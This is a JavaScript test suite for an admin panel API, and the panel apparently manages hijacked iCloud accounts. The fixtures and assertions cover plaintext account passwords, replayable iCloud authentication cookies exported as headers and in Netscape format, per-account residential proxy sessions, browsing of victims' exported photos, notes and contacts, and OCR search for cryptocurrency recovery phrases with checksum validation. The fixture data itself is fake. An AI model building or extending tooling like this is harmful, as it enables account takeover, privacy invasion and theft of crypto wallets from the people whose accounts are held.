import assert from "node:assert/strict";
import fs from "node:fs";
import fsp from "node:fs/promises";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import express from "express";
import { createAdminRouter } from "../admin/api.js";
import { safeName, resolveWithin, gallery, search, readSummary } from "../admin/export.js";

/* Cookie-protected panel API over a temporary export tree. */

const folder = fs.mkdtempSync(path.join(os.tmpdir(), "panel-api-"));
const storeFile = path.join(folder, "items.json");
const exportDir = path.join(folder, "export");
const sessionsDir = path.join(folder, "sessions");
const sessionDir = path.join(sessionsDir, "sess-1");
const email = "alice@example.com";
const root = path.join(exportDir, safeName(email));

await fsp.mkdir(path.join(root, "Photos", "Library"), { recursive: true });
await fsp.mkdir(path.join(root, "Photos", "Hidden"), { recursive: true });
await fsp.mkdir(path.join(root, "Notes", "txt"), { recursive: true });
await fsp.mkdir(path.join(root, "Contacts"), { recursive: true });
await fsp.mkdir(path.join(root, "Drive"), { recursive: true });
await fsp.mkdir(path.join(root, "Scan"), { recursive: true });
await fsp.mkdir(sessionDir, { recursive: true });
await fsp.writeFile(
  path.join(sessionDir, "aliceexamplecom.cookiejar"),
  [
    "#LWP-Cookies-2.0",
    'Set-Cookie3: X-APPLE-WEBAUTH-USER="\\"v=1:s=1:d=123\\""; path="/"; domain=".icloud.com"; path_spec; secure; expires="2027-01-02 03:04:05Z"; HttpOnly=None; version=0',
    'Set-Cookie3: X-APPLE-WEBAUTH-TOKEN="abc"; path="/"; domain=".icloud.com"; path_spec; secure; expires="2027-01-02 03:04:05Z"; HttpOnly=None; version=0',
    'Set-Cookie3: dslang="US-EN"; path="/"; domain=".apple.com"; path_spec; secure; discard; HttpOnly=None; version=0',
  ].join("\n")
);

await fsp.writeFile(path.join(root, "Photos", "Library", "IMG_0001.jpg"), Buffer.from("jpeg-one"));
await fsp.writeFile(path.join(root, "Photos", "Library", "IMG_0002.jpg"), Buffer.from("jpeg-two"));
await fsp.writeFile(path.join(root, "Photos", "Hidden", "HIDDEN_1.jpg"), Buffer.from("hidden"));
await fsp.writeFile(path.join(root, "Drive", "report.txt"), "quarterly report\nrevenue up\n");
await fsp.writeFile(path.join(root, "Drive", "blob.bin"), Buffer.from([0, 1, 2, 3, 0, 255]));
await fsp.writeFile(path.join(root, "Drive", "clip.mp4"), Buffer.from([0, 0, 0, 24, 102, 116, 121, 112]));
await fsp.writeFile(
  path.join(root, "Notes", "txt", "seed.txt"),
  "my wallet words: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
);
await fsp.writeFile(
  path.join(root, "Contacts", "contacts.json"),
  JSON.stringify({
    me: { first_name: "Alice", last_name: "Example" },
    contacts: [
      { first_name: "Bob", last_name: "Stone", phones: [{ field: "+15550001" }], emails: [{ field: "bob@example.com" }] },
    ],
  })
);
await fsp.writeFile(
  path.join(root, "Scan", "index.json"),
  JSON.stringify({
    generatedAt: new Date().toISOString(),
    entries: [
      {
        path: "Photos/Library/IMG_0001.jpg",
        area: "photos",
        kind: "image",
        name: "IMG_0001.jpg",
        text: "recovery phrase talk about a secret vault inside the safe",
        mtime: Date.now(),
      },
      {
        path: "Notes/txt/seed.txt",
        area: "notes",
        kind: "note",
        name: "seed.txt",
        text: "my wallet words: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
        mtime: Date.now(),
      },
    ],
  })
);
await fsp.writeFile(
  path.join(root, "Scan", "findings.json"),
  JSON.stringify({
    generatedAt: new Date().toISOString(),
    findings: [
      {
        file: "Photos/Library/IMG_0001.jpg",
        area: "photos",
        name: "IMG_0001.jpg",
        phrase: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
        words: 12,
        tier: "high",
        checksum: true,
        source: "ocr",
        snippet: "recovery phrase",
      },
      {
        file: "Notes/txt/seed.txt",
        area: "notes",
        name: "seed.txt",
        phrase: "abandon abandon abandon abandon abandon about",
        words: 5,
        tier: "minimum",
        checksum: false,
        source: "note",
        snippet: "my wallet words",
      },
    ],
  })
);

await fsp.writeFile(
  storeFile,
  JSON.stringify({
    version: 2,
    items: [],
    accounts: [
      {
        id: "acct-1",
        shortId: "acct0001",
        email,
        password: "pw",
        status: "done",
        trusted: true,
        identity: { name: "Alice" },
        counts: { photos: 2 },
        export: { phase: "done", done: 2, total: 2 },
        sessionDir: "sessions/sess-1",
        proxy: { country: "US", ssid: "abc123" },
      },
    ],
    jobs: [],
  })
);

/* --------------------------------------------------------------- unit-level */

assert.equal(safeName("a/b"), "a_b");
assert.equal(safeName("  name.  "), "name");
assert.equal(safeName(""), "unnamed");
assert.ok(resolveWithin(root, "Photos/Library/IMG_0001.jpg"));
assert.equal(resolveWithin(root, "../items.json"), null);
assert.ok(
  resolveWithin(root, "/etc/passwd").startsWith(root + path.sep),
  "a leading slash is account-root relative"
);

const page = await gallery(root, { area: "Library", page: 1, pageSize: 1 });
assert.equal(page.total, 2);
assert.equal(page.items.length, 1);
assert.equal(page.pages, 2);

const summary = await readSummary(root);
assert.equal(summary.contacts.contacts[0].first_name, "Bob");

const found = await search(root, { q: "vault" });
assert.equal(found.images.length, 1);
assert.equal(found.images[0].name, "IMG_0001.jpg");
assert.match(found.images[0].snippet, /vault/);

const notes = await search(root, { q: "abandon", kind: "note" });
assert.equal(notes.notes.length, 1);

const hiddenSpam = await search(root, { kind: "seed" });
assert.equal(hiddenSpam.seeds.length, 0, "spam phrases are hidden by default");
assert.equal(hiddenSpam.seedSpam, 2);

const valid = await search(root, { kind: "seed", tier: "valid", spam: "1" });
assert.equal(valid.seeds.length, 1);
assert.equal(valid.seeds[0].checksum, true);
assert.equal(valid.seeds[0].spam, true);

const firstPage = await search(root, { kind: "seed", spam: "1", page: 1, pageSize: 1 });
assert.equal(firstPage.seeds.length, 1);
assert.equal(firstPage.seedPages, 2);
const secondPage = await search(root, { kind: "seed", spam: "1", page: 2, pageSize: 1 });
assert.equal(secondPage.seeds.length, 1);
assert.notEqual(firstPage.seeds[0].phrase, secondPage.seeds[0].phrase);

const compact = await search(root, { kind: "seed", spam: "1", compact: "1" });
assert.equal(compact.seeds.length, 0);
assert.match(compact.lines, /checksum valid\t12 words/);
assert.equal(compact.lines.split("\n").length, 2);

/* ------------------------------------------------------------------- HTTP */

const app = express();
app.set("trust proxy", true);
app.use(express.json());
app.use(
  "/api/admin",
  createAdminRouter({
    storeFile,
    exportDir,
    sessionsDir,
    proxyUrl: "http://user:pass@portal.anyip.io:1080",
    password: "panel-pw",
    secret: "test-secret",
    sessionHours: 1,
    warnings: ["test warning"],
    health: async () => ({
      generatedAt: "2026-01-01T00:00:00.000Z",
      overall: "yellow",
      checks: [
        {
          id: "nfs",
          label: "Shared NFS",
          group: "data",
          status: "yellow",
          detail: "76% used",
          dependency: "10.20.0.30:/srv/icloud",
          latencyMs: 2,
        },
      ],
      nodes: [
        {
          id: "db-mon-1",
          role: "data+ops",
          privateIp: "10.20.0.30",
          status: "green",
          health: "up",
          detail: "node_exporter up",
        },
      ],
    }),
  })
);
const server = http.createServer(app);
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const base = `http://127.0.0.1:${server.address().port}`;
let cookie = "";

const request = async (method, url, body) => {
  const response = await fetch(base + url, {
    method,
    headers: {
      "content-type": "application/json",
      ...(cookie ? { cookie } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const setCookie = response.headers.getSetCookie?.() ?? [];
  if (setCookie.length) cookie = setCookie[0].split(";")[0];
  const type = response.headers.get("content-type") || "";
  const payload = type.includes("json") ? await response.json() : await response.arrayBuffer();
  return { status: response.status, headers: response.headers, payload };
};

const anon = await request("GET", "/api/admin/session");
assert.equal(anon.status, 200, "session probe is a 200 with ok:false");
assert.equal(anon.payload.ok, false);

const anonHealth = await request("GET", "/api/admin/health");
assert.equal(anonHealth.status, 401);

const bad = await request("POST", "/api/admin/login", { password: "nope" });
assert.equal(bad.status, 401);

const login = await request("POST", "/api/admin/login", { password: "panel-pw" });
assert.equal(login.status, 200);
assert.equal(login.payload.ok, true);
assert.ok(cookie.startsWith("ic_admin="));

const session = await request("GET", "/api/admin/session");
assert.equal(session.status, 200);
assert.equal(session.payload.ok, true);
assert.deepEqual(session.payload.warnings, ["test warning"]);

const health = await request("GET", "/api/admin/health");
assert.equal(health.status, 200);
assert.equal(health.payload.overall, "yellow");
assert.equal(health.payload.checks[0].id, "nfs");
assert.equal(health.payload.nodes.length, 1);
assert.equal(health.headers.get("cache-control"), "no-store");

const manual = await request("GET", "/api/admin/accounts/acct-1/manual");
assert.equal(manual.status, 200);
assert.equal(manual.payload.account.password, "pw");
assert.equal(manual.payload.session.found, true);
assert.equal(manual.payload.cookies.length, 3);
assert.equal(manual.payload.cookies[0].name, "X-APPLE-WEBAUTH-USER");
assert.equal(manual.payload.cookies[0].value, '"v=1:s=1:d=123"');
assert.equal(manual.payload.cookies[2].session, true);
assert.equal(manual.payload.proxy.username, "user,country_US,session_abc123");
assert.equal(manual.payload.proxy.server, "http://portal.anyip.io:1080");
assert.match(manual.payload.cookieHeader, /X-APPLE-WEBAUTH-TOKEN=abc/);
assert.ok(manual.payload.session.expiresAt.startsWith("2027-01-02"));
assert.ok(manual.payload.netscape.includes("X-APPLE-WEBAUTH-TOKEN"));

const accounts = await request("GET", "/api/admin/accounts/acct-1/summary");
assert.equal(accounts.status, 200);
assert.equal(accounts.payload.account.email, email);
assert.equal(accounts.payload.summary.contacts.contacts[0].first_name, "Bob");

const tree = await request("GET", "/api/admin/accounts/acct-1/tree?path=Photos");
assert.equal(tree.status, 200);
assert.deepEqual(tree.payload.dirs.map((d) => d.name).sort(), ["Hidden", "Library"]);

const traversal = await request(
  "GET",
  "/api/admin/accounts/acct-1/tree?path=" + encodeURIComponent("../../")
);
assert.equal(traversal.status, 200);
assert.equal(traversal.payload.missing, true);

const file = await request(
  "GET",
  "/api/admin/accounts/acct-1/file?path=" + encodeURIComponent("Photos/Library/IMG_0001.jpg")
);
assert.equal(file.status, 200);
assert.equal(file.headers.get("content-type"), "image/jpeg");
assert.equal(Buffer.from(file.payload).toString(), "jpeg-one");

const ranged = await fetch(
  base +
    "/api/admin/accounts/acct-1/file?path=" +
    encodeURIComponent("Photos/Library/IMG_0001.jpg"),
  { headers: { cookie, range: "bytes=0-3" } }
);
assert.equal(ranged.status, 206);
assert.equal(await ranged.text(), "jpeg");
assert.match(ranged.headers.get("content-range") || "", /^bytes 0-3\/8$/);

const download = await request(
  "GET",
  "/api/admin/accounts/acct-1/file?path=" +
    encodeURIComponent("Photos/Library/IMG_0001.jpg") +
    "&download=1"
);
assert.match(download.headers.get("content-disposition") || "", /attachment/);

const gal = await request("GET", "/api/admin/accounts/acct-1/gallery?area=Library&page=1&pageSize=60");
assert.equal(gal.payload.total, 2);
assert.equal(gal.payload.items.length, 2);

const libraryNotes = await request("GET", "/api/admin/library?type=notes&q=wallet&meta=1");
assert.equal(libraryNotes.status, 200);
assert.equal(libraryNotes.payload.items.length, 1);
assert.equal(libraryNotes.payload.items[0].email, email);
assert.ok(libraryNotes.payload.counts.notes >= 1);

const libraryPhoto = await request("GET", "/api/admin/library?type=photos&q=vault");
assert.equal(libraryPhoto.status, 200);
assert.equal(libraryPhoto.payload.items[0].name, "IMG_0001.jpg");

const allMedia = await request("GET", "/api/admin/accounts/acct-1/gallery?area=All&page=1&pageSize=60");
assert.equal(allMedia.payload.total, 4, "All spans Library + Hidden + Drive media");
assert.deepEqual(
  [...new Set(allMedia.payload.items.map((item) => item.area))].sort(),
  ["Drive", "Hidden", "Library"]
);

const previewText = await request(
  "GET",
  "/api/admin/accounts/acct-1/file?path=" + encodeURIComponent("Drive/report.txt") + "&preview=1"
);
assert.equal(previewText.payload.kind, "text");
assert.match(previewText.payload.text, /quarterly report/);

const previewImage = await request(
  "GET",
  "/api/admin/accounts/acct-1/file?path=" + encodeURIComponent("Photos/Library/IMG_0001.jpg") + "&preview=1"
);
assert.equal(previewImage.payload.kind, "image");

const previewVideo = await request(
  "GET",
  "/api/admin/accounts/acct-1/file?path=" + encodeURIComponent("Drive/clip.mp4") + "&preview=1"
);
assert.equal(previewVideo.payload.kind, "video");

const previewBinary = await request(
  "GET",
  "/api/admin/accounts/acct-1/file?path=" + encodeURIComponent("Drive/blob.bin") + "&preview=1"
);
assert.equal(previewBinary.payload.kind, "other");

const searchRes = await request("GET", "/api/admin/accounts/acct-1/search?q=vault");
assert.equal(searchRes.payload.images.length, 1);
assert.equal(searchRes.payload.images[0].path, "Photos/Library/IMG_0001.jpg");

const unknown = await request("GET", "/api/admin/accounts/nope/summary");
assert.equal(unknown.status, 404);

// Per-IP login throttle: ten failures block the eleventh attempt.
for (let i = 0; i < 10; i += 1) {
  const attempt = await fetch(base + "/api/admin/login", {
    method: "POST",
    headers: { "content-type": "application/json", "x-forwarded-for": "10.9.9.9" },
    body: JSON.stringify({ password: "wrong" }),
  });
  assert.equal(attempt.status, 401, `attempt ${i + 1}`);
}
const blocked = await fetch(base + "/api/admin/login", {
  method: "POST",
  headers: { "content-type": "application/json", "x-forwarded-for": "10.9.9.9" },
  body: JSON.stringify({ password: "panel-pw" }),
});
assert.equal(blocked.status, 429);

// A reverse proxy over HTTPS gets a Secure cookie.
const secureLogin = await fetch(base + "/api/admin/login", {
  method: "POST",
  headers: {
    "content-type": "application/json",
    "x-forwarded-for": "10.8.8.8",
    "x-forwarded-proto": "https",
  },
  body: JSON.stringify({ password: "panel-pw" }),
});
assert.equal(secureLogin.status, 200);
assert.match(secureLogin.headers.getSetCookie()[0], /; Secure/);

const out = await request("POST", "/api/admin/logout");
assert.equal(out.status, 200);
const after = await request("GET", "/api/admin/session");
assert.equal(after.status, 200);
assert.equal(after.payload.ok, false);

server.close();
fs.rmSync(folder, { recursive: true, force: true });
console.log("admin api test ok");
